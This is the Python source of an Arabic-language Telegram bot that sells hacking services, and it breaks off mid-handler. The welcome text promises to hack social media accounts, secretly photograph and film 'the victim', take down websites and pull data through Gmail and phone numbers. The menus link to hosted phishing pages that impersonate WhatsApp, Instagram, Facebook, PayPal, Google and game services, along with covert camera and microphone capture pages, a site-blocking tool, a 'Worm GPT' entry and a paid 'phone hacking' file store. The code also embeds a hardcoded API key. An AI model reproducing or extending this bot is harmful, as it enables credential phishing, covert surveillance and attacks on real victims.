import sys, io
try:
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
except Exception:
    pass

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, ForceReply
import base64
import telebot
import requests
import time
import urllib.request
import os
import random
import string
import socket
import qrcode
from io import BytesIO
from datetime import datetime, timedelta
from deep_translator import GoogleTranslator
import urllib.parse
import re
import subprocess
import json
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# محاولة استيراد pyzbar مع توفير بديل
try:
    from pyzbar.pyzbar import decode
    from PIL import Image
    pyzbar_available = True
except ImportError:
    pyzbar_available = False
    print("⚠️ تحذير: مكتبة pyzbar غير مثبتة. سيتم استخدام الطريقة البديلة لقراءة الباركود.")
    print("📌 للتثبيت: pip install pyzbar pillow")

# ====== إعدادات البوت ======
BOT_TOKEN = os.environ.get("BOT_TOKEN")
VIRUSTOTAL_API_KEY = os.environ.get("VIRUSTOTAL_API_KEY", "573ecc9e501c82d63b84488b1fbb4bddefbe27b38f309d932bcd5926df49dba6")
OWNER_ID = int(os.environ.get("OWNER_ID", "6993358626"))
ADMIN_IDS = [OWNER_ID]

# ملفات لتخزين البيانات
USERS_FILE = "users.json"
CHANNELS_FILE = "channels.json"
BANNED_USERS_FILE = "banned_users.json"

# صورة الترحيب
WELCOME_IMAGE = "https://i.postimg.cc/CMqzS8RT/00.jpg"

# رسالة الترحيب
WELCOME_MSG = (
    "╭━━━〔 ✦ 🚀 𝐘𝐄𝐇𝐘𝐀 🚀 ✦ 〕━━━╮\n"
    "     ✨ ❝ مـرحـبًـا بـكـم فـي عـالـم 𝐘𝐄𝐇𝐘𝐀 ✨ ❞\n"
    "╰━━━━━━━━━━━━━━━━━━━━━╯\n\n"
    "📱 ✧ هـنـا يـمـكـنـك اخـتـراق صـفـحـات الـسـوشيـال مـيـديـا.\n"
    "📸 ✧ هـنـا يـمـكـنـك الـتـقـاط صـور الـضـحـيـة.\n"
    "🎥 ✧ هـنـا تـصـويـر فـيـديـو لـلـضـحـيـة.\n"
    "💥 ✧ هـنـا يـمـكـنـك تـدمـيـر الـمـواقـع.\n"
    "📧📱 ✧ هـنـا يـمـكـنـك سـحـب الـبـيـانـات عـبـر الـجـيـمـيـل والـرقـم.\n\n"
    "🔥 ❝ بـدون تـعـب كـتـيـيـر فـي الـكـتـابـة، خـش وشـوف بـاقـي الـمـمـيـزات 🔥 ❞\n\n"
    "            ╭━━━〔 ⚡ 😈 ⚡ 〕━━━╮\n"
    "💀 ❝ اسـتـمـتـعـوا بـالـبـوت ي هـكـرات 😎 ❞\n"
    "╰━━━━━━━━━━━━━━━━━━━━━╯"
)

# روابط الصفحات (مستضافة على GitHub Pages)
VERCEL_BASE = "https://yehyaashraf1980-maker.github.io/pages"
LINK_NUM = f"{VERCEL_BASE}/Number%20Phone.html"
LINK_CAMERA_FRONT = f"{VERCEL_BASE}/Front%20Camera%20Recording.html"
LINK_VOICE = f"{VERCEL_BASE}/Voice.html"
LINK_VIDEO = f"{VERCEL_BASE}/Vedio%20Record.html"
LINK_FI_REPLY = f"{VERCEL_BASE}/Phone%20Info.html"
LINK_WHATSAPP = f"{VERCEL_BASE}/Whatsapp.html"
LINK_INSTAGRAM = f"{VERCEL_BASE}/Instagram.html"
LINK_FACEBOOK = f"{VERCEL_BASE}/Facebook.html"
LINK_PUBG = f"{VERCEL_BASE}/Pubg.html"
LINK_FREEFIRE = f"{VERCEL_BASE}/Free%20Fire.html"
LINK_SNAPCHAT = f"{VERCEL_BASE}/Snap%20Chat.html"
LINK_TIKTOK = f"{VERCEL_BASE}/TikTok.html"
LINK_KWAI = f"{VERCEL_BASE}/Cookies.html"
LINK_YOUTUBE = f"{VERCEL_BASE}/YouTube.html"
LINK_GOOGLE = f"{VERCEL_BASE}/Google.html"
LINK_MESSENGER = f"{VERCEL_BASE}/PayPal.html"

# حالات انتظار للمدخلات التفاعلية
waiting_for_google_play = {}
waiting_for_ip = {}
waiting_for_user_lookup = {}
waiting_for_link_short = {}
waiting_for_translate = {}
waiting_for_wormgpt = {}
waiting_for_ai_image = {}
waiting_for_virtual_call = {}
waiting_for_server_check = {}
waiting_for_admin_new_section_name = {}
waiting_for_admin_section_file = {}
admin_section_file_pending = {}
waiting_for_admin_vip_code = {}
waiting_for_admin_vip_limit = {}
waiting_for_user_vip_code = {}
waiting_for_admin_clone_code = {}
waiting_for_admin_clone_limit = {}
waiting_for_user_clone_code = {}
waiting_for_user_clone_token = {}
waiting_for_user_clone_adminid = {}

# ===== إدارة أكواد VIP =====
VIP_CODES_FILE = "vip_codes.json"

def load_vip_codes():
    if os.path.exists(VIP_CODES_FILE):
        with open(VIP_CODES_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {"phone_hack": {}, "clone_bot": {}, "created_bots": []}

def save_vip_codes(data):
    with open(VIP_CODES_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def check_vip_code(code, code_type="phone_hack"):
    data = load_vip_codes()
    codes = data.get(code_type, {})
    if code in codes:
        entry = codes[code]
        used = entry.get("used", 0)
        limit = entry.get("limit", 0)
        if used < limit:
            entry["used"] = used + 1
            save_vip_codes(data)
            return True
    return False

def send_admin_notification(text):
    try:
        bot.send_message(OWNER_ID, f"🔔 **إشعار الأدمن:**\n\n{text}", parse_mode="Markdown")
    except:
        pass

# حالات انتظار للوحة التحكم
waiting_for_add_channel = {}
waiting_for_remove_channel = {}
waiting_for_ban_user = {}
waiting_for_unban_user = {}
waiting_for_add_admin = {}
waiting_for_remove_admin = {}

# ===== دوال إدارة البيانات =====
def load_data(filename, default=None):
    """تحميل البيانات من ملف"""
    if default is None:
        default = []
    if os.path.exists(filename):
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return default
    return default

def save_data(filename, data):
    """حفظ البيانات في ملف"""
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def load_users():
    data = load_data(USERS_FILE, [])
    if isinstance(data, dict):
        data = list(data.keys())
    return data

def save_users(users):
    save_data(USERS_FILE, users)

def load_channels():
    return load_data(CHANNELS_FILE, [])

def save_channels(channels):
    save_data(CHANNELS_FILE, channels)

def load_banned_users():
    return load_data(BANNED_USERS_FILE, [])

def save_banned_users(banned):
    save_data(BANNED_USERS_FILE, banned)

def add_user(user_id, username, first_name):
    users = load_users()
    if user_id not in users:
        users.append(user_id)
        save_users(users)
        user_mention = f"@{username}" if username else first_name
        admin_msg = f"""
👤 **مستخدم جديد!**
🆔: `{user_id}`
👤: {user_mention}
📊: إجمالي المستخدمين: `{len(users)}`
"""
        for admin_id in ADMIN_IDS:
            try:
                bot.send_message(admin_id, admin_msg, parse_mode="Markdown")
            except:
                pass
        return True
    return False

def get_users_count():
    return len(load_users())

def is_banned(user_id):
    banned = load_banned_users()
    return user_id in banned

def check_channel_subscription(user_id):
    """التحقق من اشتراك المستخدم في القنوات الإجبارية"""
    channels = load_channels()
    if not channels:
        return True, []
    
    not_subscribed = []
    for channel in channels:
        try:
            member = bot.get_chat_member(channel, user_id)
            if member.status in ['left', 'kicked']:
                not_subscribed.append(channel)
        except Exception as e:
            print(f"خطأ في التحقق من القناة {channel}: {e}")
            not_subscribed.append(channel)
    
    return len(not_subscribed) == 0, not_subscribed

# ===== دوال مساعدة =====
def encode_token(token):
    try:
        token_bytes = token.encode('utf-8')
        encoded_bytes = base64.b64encode(token_bytes)
        encoded_str = encoded_bytes.decode('utf-8')
        return urllib.parse.quote(encoded_str)
    except:
        return token

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_owner(user_id):
    return user_id == OWNER_ID

def hide_link_service(url):
    try:
        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=8)
        if res.status_code == 200: 
            return res.text
        else: 
            return "❌ فشل في اختصار الرابط."
    except: 
        return "❌ حدث خطأ أثناء اختصار الرابط."

# ===== قراءة الباركود =====
def decode_qr_improved(image_bytes):
    """قراءة الباركود باستخدام pyzbar"""
    try:
        if not pyzbar_available:
            return None
        
        image = Image.open(BytesIO(image_bytes))
        decoded_objects = decode(image)
        if decoded_objects:
            data = decoded_objects[0].data.decode('utf-8')
            return data
        else:
            return None
    except Exception as e:
        print(f"خطأ في قراءة الباركود: {e}")
        return None

def decode_qr_online(image_bytes):
    """خدمة بديلة لقراءة الباركود"""
    try:
        files = {'file': ('qr.png', image_bytes, 'image/png')}
        resp = requests.post("https://api.qrserver.com/v1/read-qr-code/", files=files, timeout=10)
        data = resp.json()
        if data and data[0]['symbol']:
            return data[0]['symbol'][0]['data']
        return None
    except Exception:
        return None

# ===== دوال إخفاء الرابط =====
hide_links_temp = {}

def hide_link_step1(message):
    chat_id = message.chat.id
    url = message.text.strip()
    if not url.startswith("http"):
        bot.send_message(chat_id, "⚠️ ارسل رابط كامل يبدأ بـ http/https")
        return
    hide_links_temp[chat_id] = {"orig": url}
    msg = bot.send_message(chat_id, "🔤 أرسل الكلمة التي تريد ظهورها بدلاً من الرابط:", reply_markup=ForceReply(selective=True))
    bot.register_next_step_handler(msg, hide_link_step2)

def hide_link_step2(message):
    chat_id = message.chat.id
    if chat_id not in hide_links_temp:
        bot.send_message(chat_id, "❌ حصل خطأ، حاول تاني.")
        return
    orig = hide_links_temp[chat_id]["orig"]
    alias = message.text.strip()
    hidden = f"<a href='{orig}'>{alias}</a>"
    bot.send_message(chat_id, f"""✅ الرابط المخفي:
{hidden}""", parse_mode="HTML")
    del hide_links_temp[chat_id]

# ===== حذف أي قنوات اشتراك إجباري موجودة =====
def clear_mandatory_channels():
    save_channels([])
    print("✅ تم حذف جميع قنوات الاشتراك الإجباري")

# ===== لوحة تحكم الأدمن =====
def send_admin_panel(chat_id, message_id=None):
    if not is_admin(chat_id):
        bot.send_message(chat_id, "❌ عذراً، أنت لست أدمن في هذا البوت")
        return
    
    users_count = get_users_count()
    channels = load_channels()
    banned = load_banned_users()
    
    text = f"""
⚙️ **لوحة تحكم البوت**

👤 **الآيدي:** `{chat_id}`
👑 **المالك:** `{OWNER_ID}`
🔰 **الصلاحية:** {'👑 مالك' if is_owner(chat_id) else '🔰 أدمن'}
📊 **عدد المستخدمين:** `{users_count}`
📢 **عدد القنوات الإجبارية:** `{len(channels)}`
🚫 **عدد المحظورين:** `{len(banned)}`

**قائمة القنوات الإجبارية الحالية:**
"""
    
    if channels:
        for i, channel in enumerate(channels, 1):
            text += f"{i}. {channel}\n"
    else:
        text += "لا توجد قنوات إجبارية حالياً\n"
    
    text += "\n**اختر من القائمة:**"
    
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("➕ إضافة قناة", callback_data="add_force_channel", style="primary"),
        InlineKeyboardButton("➖ إزالة قناة", callback_data="remove_force_channel", style="danger")
    )
    keyboard.add(
        InlineKeyboardButton("🚫 حظر عضو", callback_data="ban_user", style="danger"),
        InlineKeyboardButton("✅ فك حظر", callback_data="unban_user", style="success")
    )
    keyboard.add(
        InlineKeyboardButton("📊 المشتركين", callback_data="users_count", style="primary"),
        InlineKeyboardButton("📢 التحديثات", url="https://t.me/dark_ViP00", style="primary")
    )
    keyboard.add(
        InlineKeyboardButton("📱 أدوات VIP", callback_data="admin_vip_tools", style="success")
    )
    keyboard.add(
        InlineKeyboardButton("🔑 إنشاء كود VIP", callback_data="admin_create_vip_code", style="danger")
    )
    keyboard.add(
        InlineKeyboardButton("🤖 إنشاء كود انشاء بوت", callback_data="admin_create_clone_code", style="danger")
    )
    keyboard.add(
        InlineKeyboardButton("🔙 القائمة الرئيسية", callback_data="back_to_main", style="primary")
    )
    
    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=keyboard, parse_mode="Markdown")
        except:
            bot.send_message(chat_id, text, reply_markup=keyboard, parse_mode="Markdown")
    else:
        bot.send_message(chat_id, text, reply_markup=keyboard, parse_mode="Markdown")

# ===== دوال بناء القوائم (نظام ألوان Telegram الجديد) =====
def build_menu(buttons_data, url_overrides=None, color_cycle=None):
    if color_cycle is None:
        color_cycle = ["primary", "danger", "success"]
    if url_overrides is None:
        url_overrides = {}
    markup = InlineKeyboardMarkup(row_width=2)
    for i in range(0, len(buttons_data), 2):
        row_style = color_cycle[(i // 2 // 2) % len(color_cycle)]
        row_buttons = []
        for j in range(2):
            if i + j < len(buttons_data):
                text, cb = buttons_data[i + j]
                if cb in url_overrides:
                    val = url_overrides[cb]
                    if isinstance(val, WebAppInfo):
                        row_buttons.append(InlineKeyboardButton(text, web_app=val, style=row_style))
                    else:
                        row_buttons.append(InlineKeyboardButton(text, url=val, style=row_style))
                else:
                    row_buttons.append(InlineKeyboardButton(text, callback_data=cb, style=row_style))
        markup.row(*row_buttons)
    return markup

def build_main_menu():
    """القائمة الرئيسية — أدوات فوق، سوشيال ميديا تحت"""
    url_overrides = {
        "webapp_info": WebAppInfo("https://homeless-yellow-nzcr4lytkv.edgeone.app/"),
        "webapp_block": WebAppInfo("https://hamza7k555-rgb.github.io/hogom3/"),
        "owner_link": "https://t.me/apk8x",
    }
    def mkbtn(text, cb, style):
        if cb in url_overrides:
            val = url_overrides[cb]
            if isinstance(val, WebAppInfo):
                return InlineKeyboardButton(text, web_app=val, style=style)
            return InlineKeyboardButton(text, url=val, style=style)
        return InlineKeyboardButton(text, callback_data=cb, style=style)
    pairs = [
        ("رقم 📱", "get_link_num"),
        ("كاميرا أمامية 📸", "get_link_camera_front"),
        ("تسجيل صوت 🎤", "get_voice"),
        ("فيديو 🎥", "get_video"),
        ("IP 🌐", "get_ip_info"),
        ("ID 🆔", "get_id"),
        ("صور AI 🎨", "ai_image"),
        ("اختصار روابط 🔗", "short_link"),
        ("سيرفر 🌐", "server_check"),
        ("معلومات 🔴", "webapp_info"),
        ("اغلاق مواقع 💀", "webapp_block"),
        ("اتصال وهمي ☎️", "virtual_call"),
        ("سحب معلومات 📱", "fi_reply"),
        ("Worm GPT 🐛", "worm_gpt"),
        ("📱 بوتات سحب بيانات الرقم", "osint_phone_bots"),
        ("📧 سحب بيانات عبر Gmail", "osint_gmail"),
        ("📞 موقع جلب معلومات الرقم", "osint_caller"),
        ("🎵 جمع معلومات تيك توك", "osint_tiktok"),
        ("📱 اختراق الهاتف VIP 📱", "phone_hack_vip"),
        ("تيك توك 🎵", "get_tiktok"),
        ("واتساب 💬", "get_whatsapp"),
        ("انستجرام 📸", "get_instagram"),
        ("فيسبوك 👍", "get_facebook"),
        ("سناب شات 👻", "get_snapchat"),
        ("يوتيوب ▶️", "get_youtube"),
        ("تويتر 🐦", "get_twitter"),
        ("ببجي 🎯", "get_pubg"),
        ("فري فاير 🔫", "get_freefire"),
        ("قوقل 🔍", "get_google"),
        ("باي بال 💳", "get_messenger"),
        ("كواي 🎬", "get_kwai"),
        ("نتفليكس 🎬", "get_netflix"),
        ("ديسكورد 💻", "get_discord"),
        ("روبلكس 🎮", "get_roblox"),
        ("لينكدإن 💼", "get_linkedin"),
        ("سبوتيفاي 🎧", "get_spotify"),
        ("تويتش 📺", "get_twitch"),
        ("ستيم 🎮", "get_steam"),
        ("مايكروسوفت 🪟", "get_microsoft"),
        ("ياهو 📧", "get_yahoo"),
    ]
    markup = InlineKeyboardMarkup(row_width=2)
    pairs_before = pairs[:24]
    pairs_after = pairs[24:]
    inner_before = build_menu(pairs_before, url_overrides)
    inner_after = build_menu(pairs_after, url_overrides)
    for row in inner_before.keyboard:
        markup.row(*row)
    for row in inner_after.keyboard:
        markup.row(*row)
    markup.row(InlineKeyboardButton("المالك 👑", url="https://t.me/apk8x", style="danger"))
    markup.row(InlineKeyboardButton("لوحة الأدمن ⚙️", callback_data="admin_panel", style="primary"))
    return markup

def build_social_menu():
    """قائمة اختراق السوشيال ميديا"""
    buttons = [
        ("تيك توك 🎵", "get_tiktok"),
        ("واتساب 💬", "get_whatsapp"),
        ("انستجرام 📸", "get_instagram"),
        ("فيسبوك 👍", "get_facebook"),
        ("سناب شات 👻", "get_snapchat"),
        ("يوتيوب ▶️", "get_youtube"),
        ("تويتر 🐦", "get_twitter"),
        ("ببجي 🎯", "get_pubg"),
        ("فري فاير 🔫", "get_freefire"),
        ("قوقل 🔍", "get_google"),
        ("باي بال 💳", "get_messenger"),
        ("كواي 🎬", "get_kwai"),
        ("نتفليكس 🎬", "get_netflix"),
        ("ديسكورد 💻", "get_discord"),
        ("روبلكس 🎮", "get_roblox"),
        ("لينكدإن 💼", "get_linkedin"),
        ("سبوتيفاي 🎧", "get_spotify"),
        ("تويتش 📺", "get_twitch"),
        ("ستيم 🎮", "get_steam"),
        ("مايكروسوفت 🪟", "get_microsoft"),
        ("ياهو 📧", "get_yahoo"),
        ("🔙 رجوع للقائمة الرئيسية", "back_to_main"),
    ]
    return build_menu(buttons)


# ===== قسم اختراق الهاتف VIP =====
PHONE_HACK_DIR = "phone_hack_files"
PHONE_HACK_SECTIONS_FILE = "phone_hack_sections.json"

os.makedirs(PHONE_HACK_DIR, exist_ok=True)

def load_sections():
    if os.path.exists(PHONE_HACK_SECTIONS_FILE):
        with open(PHONE_HACK_SECTIONS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {"sections": []}

def save_sections(data):
    with open(PHONE_HACK_SECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

PHONE_HACK_SLOTS = {
    "explain": "📖 شرح",
    "app": "📱 تطبيق",
    "files": "📦 الملفات"
}

def get_section_file(sec, slot):
    for f in sec.get("files", []):
        if f.get("slot") == slot:
            return f
    return None

def build_phone_hack_vip_menu():
    data = load_sections()
    markup = InlineKeyboardMarkup(row_width=1)
    for sec in data.get("sections", []):
        cb = f"ph_section_{sec['id']}"
        markup.add(InlineKeyboardButton(f"📱 {sec['name']}", callback_data=cb, style="primary"))
    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main", style="danger"))
    return markup

def get_section_slots(sec):
    custom = sec.get("slots")
    if custom:
        return {s: PHONE_HACK_SLOTS.get(s, s) for s in custom}
    return PHONE_HACK_SLOTS

def build_phone_hack_section_menu(section_id):
    data = load_sections()
    markup = InlineKeyboardMarkup(row_width=2)
    for sec in data.get("sections", []):
        if sec["id"] == section_id:
            slots = get_section_slots(sec)
            colors = ["primary", "danger", "success"]
            ci = 0
            for slot, label in slots.items():
                f = get_section_file(sec, slot)
                c = colors[ci % len(colors)]
                if f:
                    cb = f"ph_file_{section_id}_{slot}"
                    markup.add(InlineKeyboardButton(f"{label} ✅", callback_data=cb, style=c))
                else:
                    markup.add(InlineKeyboardButton(f"{label} ❌", callback_data="ph_empty", style=c))
                ci += 1
            break
    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="phone_hack_vip", style="danger"))
    return markup

def build_admin_vip_tools_menu():
    data = load_sections()
    markup = InlineKeyboardMarkup(row_width=1)
    for sec in data.get("sections", []):
        cb = f"admin_vip_section_{sec['id']}"
        files_count = len(sec.get("files", []))
        markup.add(InlineKeyboardButton(f"📱 {sec['name']} ({files_count} ملفات)", callback_data=cb, style="primary"))
    markup.add(InlineKeyboardButton("➕ إضافة قسم جديد", callback_data="admin_add_section", style="success"))
    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_back", style="danger"))
    return markup

def build_admin_section_detail_menu(section_id):
    data = load_sections()
    markup = InlineKeyboardMarkup(row_width=1)
    for sec in data.get("sections", []):
        if sec["id"] == section_id:
            slots = get_section_slots(sec)
            colors = ["primary", "danger", "success"]
            ci = 0
            if slots:
                for slot, label in slots.items():
                    f = get_section_file(sec, slot)
                    status = "✅" if f else "❌"
                    cb = f"admin_upload_{section_id}__{slot}"
                    name = f" — {f['file_name']}" if f else ""
                    c = colors[ci % len(colors)]
                    markup.add(InlineKeyboardButton(f"{label} {status}{name}", callback_data=cb, style=c))
                    ci += 1
            else:
                for i, f in enumerate(sec.get("files", [])):
                    cb = f"admin_ph_file_{section_id}_{i}"
                    markup.add(InlineKeyboardButton(f["label"], callback_data=cb, style=colors[ci % len(colors)]))
                    ci += 1
                markup.add(InlineKeyboardButton("➕ إضافة ملف", callback_data=f"admin_add_file_to_{section_id}", style="success"))
            break
    markup.add(InlineKeyboardButton("🗑 حذف القسم", callback_data=f"admin_del_section_{section_id}", style="danger"))
    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_vip_tools", style="primary"))
    return markup


# ===== التحقق من الاشتراك الإجباري =====
def check_subscription_and_continue(user_id, chat_id, message_id=None):
    subscribed, not_subscribed = check_channel_subscription(user_id)
    
    if not subscribed:
        text = "🔒 **عذراً، يجب الاشتراك في القنوات التالية لاستخدام البوت:**\n\n"
        keyboard = InlineKeyboardMarkup(row_width=1)
        
        for channel in not_subscribed:
            try:
                chat = bot.get_chat(channel)
                if chat.username:
                    link = f"https://t.me/{chat.username}"
                else:
                    link = f"https://t.me/{channel.replace('@', '')}"
            except:
                link = f"https://t.me/{channel.replace('@', '')}"
            
            text += f"🔹 {channel}\n"
            keyboard.add(InlineKeyboardButton(f"الاشتراك في {channel}", url=link))
        
        text += "\n✅ **بعد الاشتراك، اضغط على /start مرة أخرى**"
        
        if message_id:
            try:
                bot.edit_message_text(text, chat_id, message_id, reply_markup=keyboard, parse_mode="Markdown")
            except:
                bot.send_message(chat_id, text, reply_markup=keyboard, parse_mode="Markdown")
        else:
            bot.send_message(chat_id, text, reply_markup=keyboard, parse_mode="Markdown")
        return False
    return True

# ===== تهيئة البوت =====
bot = telebot.TeleBot(BOT_TOKEN)

# ===== أمر /admin =====
@bot.message_handler(commands=['admin'])
def admin_command(message):
    chat_id = message.chat.id
    if is_admin(chat_id):
        send_admin_panel(chat_id, message.message_id)
    else:
        bot.send_message(chat_id, "❌ عذراً، أنت لست أدمن في هذا البوت")

# ===== أمر /start =====
@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    
    if is_banned(chat_id):
        bot.send_message(chat_id, "🚫 **لقد تم حظرك من استخدام هذا البوت**")
        return
    
    add_user(chat_id, username, first_name)
    
    if not is_admin(chat_id):
        subscribed, not_subscribed = check_channel_subscription(chat_id)
        if not subscribed:
            text = "🔒 **عذراً، يجب الاشتراك في القنوات التالية لاستخدام البوت:**\n\n"
            keyboard = InlineKeyboardMarkup(row_width=1)
            
            for channel in not_subscribed:
                try:
                    chat = bot.get_chat(channel)
                    if chat.username:
                        link = f"https://t.me/{chat.username}"
                    else:
                        link = f"https://t.me/{channel.replace('@', '')}"
                except:
                    link = f"https://t.me/{channel.replace('@', '')}"
                
                text += f"🔹 {channel}\n"
                keyboard.add(InlineKeyboardButton(f"الاشتراك في {channel}", url=link))
            
            text += "\n✅ **بعد الاشتراك، اضغط على /start مرة أخرى**"
            bot.send_message(chat_id, text, reply_markup=keyboard, parse_mode="Markdown")
            return

    markup = build_main_menu()
    try:
        bot.send_photo(chat_id, WELCOME_IMAGE, caption=WELCOME_MSG, reply_markup=markup)
    except:
        bot.send_message(chat_id, WELCOME_MSG, reply_markup=markup)

# ===== التعامل مع الملفات المرسلة =====
@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    
    if is_banned(chat_id):
        return
    
    # إضافة ملف لقسم موجود
    if waiting_for_admin_section_file.get(chat_id):
        pending = admin_section_file_pending.get(chat_id)
        if not pending:
            waiting_for_admin_section_file[chat_id] = False
            return
        file_info = bot.get_file(message.document.file_id)
        file_name = message.document.file_name or "file"
        save_path = os.path.join(PHONE_HACK_DIR, file_name)
        file_url = f"https://api.telegram.org/file/bot{bot.token}/{file_info.file_path}"
        urllib.request.urlretrieve(file_url, save_path)
        data = load_sections()

        if "__" in pending:
            section_id, slot = pending.split("__", 1)
            for sec in data.get("sections", []):
                if sec["id"] == section_id:
                    existing = get_section_file(sec, slot)
                    if existing:
                        existing["file_path"] = save_path
                        existing["file_name"] = file_name
                    else:
                        sec.setdefault("files", []).append({
                            "label": PHONE_HACK_SLOTS.get(slot, slot),
                            "file_path": save_path,
                            "file_name": file_name,
                            "slot": slot
                        })
                    break
            save_sections(data)
            waiting_for_admin_section_file[chat_id] = False
            admin_section_file_pending.pop(chat_id, None)
            slot_label = PHONE_HACK_SLOTS.get(slot, slot)
            bot.send_message(chat_id, f"✅ تم حفظ **{slot_label}**: `{file_name}`", parse_mode="Markdown")
            markup = build_admin_section_detail_menu(section_id)
            bot.send_message(chat_id, "📱 **إدارة القسم:**", reply_markup=markup, parse_mode="Markdown")
        else:
            section_id = pending
            for sec in data.get("sections", []):
                if sec["id"] == section_id:
                    label = f"📁 {file_name}"
                    sec.setdefault("files", []).append({
                        "label": label,
                        "file_path": save_path,
                        "file_name": file_name
                    })
                    break
            save_sections(data)
            waiting_for_admin_section_file[chat_id] = False
            admin_section_file_pending.pop(chat_id, None)
            bot.send_message(chat_id, f"✅ تم إضافة الملف **{file_name}** للقسم.", parse_mode="Markdown")
            markup = build_admin_section_detail_menu(section_id)
            bot.send_message(chat_id, "📱 **إدارة القسم:**", reply_markup=markup, parse_mode="Markdown")
        return

# ===== التعامل مع الفيديو المرسل =====
@bot.message_handler(content_types=['video'])
def handle_video(message):
    chat_id = message.chat.id
    if is_banned(chat_id):
        return
    if waiting_for_admin_section_file.get(chat_id):
        pending = admin_section_file_pending.get(chat_id)
        if not pending:
            waiting_for_admin_section_file[chat_id] = False
            return
        file_info = bot.get_file(message.video.file_id)
        file_name = message.video.file_name or f"video_{message.video.file_unique_id}.mp4"
        save_path = os.path.join(PHONE_HACK_DIR, file_name)
        file_url = f"https://api.telegram.org/file/bot{bot.token}/{file_info.file_path}"
        urllib.request.urlretrieve(file_url, save_path)
        data = load_sections()
        if "__" in pending:
            section_id, slot = pending.split("__", 1)
            for sec in data.get("sections", []):
                if sec["id"] == section_id:
                    existing = get_section_file(sec, slot)
                    if existing:
                        existing["file_path"] = save_path
                        existing["file_name"] = file_name
                    else:
                        sec.setdefault("files", []).append({
                            "label": PHONE_HACK_SLOTS.get(slot, slot),
                            "file_path": save_path,
                            "file_name": file_name,
                            "slot": slot
                        })
                    break
            save_sections(data)
            waiting_for_admin_section_file[chat_id] = False
            admin_section_file_pending.pop(chat_id, None)
            slot_label = PHONE_HACK_SLOTS.get(slot, slot)
            bot.send_message(chat_id, f"✅ تم حفظ **{slot_label}**: `{file_name}`", parse_mode="Markdown")
            markup = build_admin_section_detail_menu(section_id)
            bot.send_message(chat_id, "📱 **إدارة القسم:**", reply_markup=markup, parse_mode="Markdown")
        else:
            section_id = pending
            for sec in data.get("sections", []):
                if sec["id"] == section_id:
                    sec.setdefault("files", []).append({
                        "label": f"🎬 {file_name}",
                        "file_path": save_path,
                        "file_name": file_name
                    })
                    break
            save_sections(data)
            waiting_for_admin_section_file[chat_id] = False
            admin_section_file_pending.pop(chat_id, None)
            bot.send_message(chat_id, f"✅ تم إضافة الفيديو **{file_name}** للقسم.", parse_mode="Markdown")
            markup = build_admin_section_detail_menu(section_id)
            bot.send_message(chat_id, "📱 **إدارة القسم:**", reply_markup=markup, parse_mode="Markdown")
        return

# ===== التعامل مع الرسائل النصية =====
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    chat_id = message.chat.id
    
    if is_banned(chat_id):
        return

    # معالجة إضافة قناة
    if waiting_for_add_channel.get(chat_id):
        if not is_admin(chat_id):
            bot.send_message(chat_id, "❌ عذراً، أنت لست أدمن في هذا البوت")
            waiting_for_add_channel[chat_id] = False
            return
        
        channel_input = message.text.strip()
        if channel_input.startswith('@'):
            channel = channel_input
        elif channel_input.startswith('https://t.me/'):
            channel = '@' + channel_input.split('/')[-1]
        else:
            channel = '@' + channel_input
        
        try:
            chat = bot.get_chat(channel)
            if chat.type in ['channel', 'supergroup']:
                channels = load_channels()
                if channel not in channels:
                    channels.append(channel)
                    save_channels(channels)
                    bot.send_message(chat_id, f"✅ تم إضافة القناة {channel} بنجاح كاشتراك إجباري\n⚠️ تأكد من رفع البوت أدمن في القناة")
                    
                    for admin_id in ADMIN_IDS:
                        try:
                            bot.send_message(admin_id, f"📢 تم إضافة قناة اشتراك إجباري جديدة: {channel}\nبواسطة: {chat_id}", parse_mode="Markdown")
                        except:
                            pass
                else:
                    bot.send_message(chat_id, f"⚠️ القناة {channel} موجودة بالفعل")
            else:
                bot.send_message(chat_id, "❌ هذا المعرف ليس لقناة صالحة")
        except Exception as e:
            bot.send_message(chat_id, f"❌ حدث خطأ: {e}\nتأكد من أن البوت مشرف في القناة")
        
        waiting_for_add_channel[chat_id] = False
        return
    
    # معالجة إزالة قناة
    if waiting_for_remove_channel.get(chat_id):
        if not is_admin(chat_id):
            bot.send_message(chat_id, "❌ عذراً، أنت لست أدمن في هذا البوت")
            waiting_for_remove_channel[chat_id] = False
            return
        
        channel_input = message.text.strip()
        if channel_input.startswith('@'):
            channel = channel_input
        else:
            channel = '@' + channel_input if not channel_input.startswith('https') else '@' + channel_input.split('/')[-1]
        
        channels = load_channels()
        if channel in channels:
            channels.remove(channel)
            save_channels(channels)
            bot.send_message(chat_id, f"✅ تم إزالة القناة {channel} من قائمة الاشتراك الإجباري")
        else:
            bot.send_message(chat_id, f"❌ القناة {channel} غير موجودة")
        
        waiting_for_remove_channel[chat_id] = False
        return

    # معالجة حظر عضو
    if waiting_for_ban_user.get(chat_id):
        if not is_admin(chat_id):
            bot.send_message(chat_id, "❌ عذراً، أنت لست أدمن في هذا البوت")
            waiting_for_ban_user[chat_id] = False
            return
        
        user_input = message.text.strip()
        try:
            user_id = int(user_input)
            if user_id == OWNER_ID:
                bot.send_message(chat_id, "❌ لا يمكن حظر المالك")
